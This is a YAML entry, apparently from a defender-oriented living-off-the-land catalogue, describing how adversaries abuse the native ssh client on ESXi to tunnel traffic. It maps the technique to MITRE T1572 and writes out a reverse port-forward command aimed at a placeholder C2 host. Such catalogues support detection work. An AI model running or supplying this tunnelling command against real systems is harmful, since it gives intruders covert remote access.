---
Name: ssh
Description: Inbuilt SSH client used to remote port-forward using a tunnel.
Author: 'Janantha Marasinghe @blueteam0ps_'
Created: 2025-01-24
Commands:
  - Command: ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>
    Description: SSH client used to create a tunnel.
    Usecase: An adversary uses the native SSH binary to create a tunnel to remote port-forwarding to their C2 host.
    Category: Tunnel Traffic
    Privileges: User
    MitreID: T1572
    OperatingSystem: ESXi
    ProceduralExamples:
    - ssh –fN -R 127.0.0.1:<SOCKS port> <user>@<C2 IP address>
Full_Path:
  - Path: /bin/ssh
  - Path: /sbin/ssh  
Resources:
  - Link: https://www.sygnia.co/blog/esxi-ransomware-ssh-tunneling-defense-strategies/
Acknowledgement:
  - Person: Ren Jie Yow
  - Person: Zhongyuan Hau (Aaron)

---
